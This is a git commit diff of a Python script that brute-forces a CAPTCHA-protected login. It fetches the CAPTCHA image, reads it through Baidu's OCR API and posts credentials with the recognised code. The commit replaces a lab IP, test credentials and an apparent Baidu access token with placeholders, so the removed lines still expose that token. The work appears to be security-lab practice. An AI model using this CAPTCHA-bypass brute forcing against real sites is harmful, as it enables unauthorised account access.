7fedf7fc35c9fc65fc4263338dfccf3c3a79fa28
G-WS <48270961+G-WS@users.noreply.github.com>
2022-07-21 11:36:28 +0800

    Update baidu_orc.py
    baidu_orc.py通过对百度云的调库对验证码图片登录进行爆破

--- security/baidu_orc.py
+++ security/baidu_orc.py
@@ -8,13 +8,13 @@ import base64
 通用文字识别（高精度版）
 '''
 
-# request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
+# request_url = "https://xxxxxxx"#百度验证码提供的api接口
 # # 二进制方式打开图片文件
 # f = open('D:\WEBSecurity\Web\image\\vcode.png', 'rb')
 # img = base64.b64encode(f.read())
 #
 # params = {"image": img}
-# access_token = '24.1dcf145291d73067a1069040692b3868.2592000.1658939652.282335-26564834'
+# access_token = 'xxxxxxx'
 # request_url = request_url + "?access_token=" + access_token
 # headers = {'content-type': 'application/x-www-form-urlencoded'}
 # response = requests.post(request_url, data=params, headers=headers)
@@ -24,17 +24,16 @@ import base64
 # 利用orc实现爆破
 def burst_login(password):
     # 虽然百度接口可以直接读取验证码的URL地址，但是内网ip不行
-    data = {'http://192.168.2.128/Security/vcode.php'}
-
+    data = {'xxxxxxxxx'}#验证码图片
     session = requests.session()
 
     # 先获取验证码的图片的二进制数据
-    resp_vcode = session.get('http://192.168.2.128/Security/vcode.php')
+    resp_vcode = session.get('xxxxxxxxx')#验证码图片所在网址
     img = base64.b64encode(resp_vcode.content)
     params = {"image": img}
-    baidu_request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
+    baidu_request_url = "xxxxxxxxxxx"##百度验证码提供的api接口
 
-    access_token = '24.1dcf145291d73067a1069040692b3868.2592000.1658939652.282335-26564834'
+    access_token = 'xxxxxxxxxxxx'
     baidu_request_url = baidu_request_url + "?access_token=" + access_token
     headers = {'content-type': 'application/x-www-form-urlencoded'}
     response_baidu = requests.post(baidu_request_url, data=params, headers=headers)
@@ -44,12 +43,12 @@ def burst_login(password):
         vcode = response_baidu.json()['words_result'][0]['words']
     print(vcode)
     #进行登录的爆破
-    url = 'http://192.168.2.128/Security/login.php'
+    url = 'xxxxxxxxxxxxxxxx'#登录界面
 
     # print(resp.text)
 
 
-    data = {'username': 'woniu', 'password': '123456', 'vcode': vcode}
+    data = {'username': '用户名', 'password': '密码', 'vcode': vcode}
     resp = session.post(url=url, data=data)
     if'vcode-error'in resp.text:
         print('验证码错误')
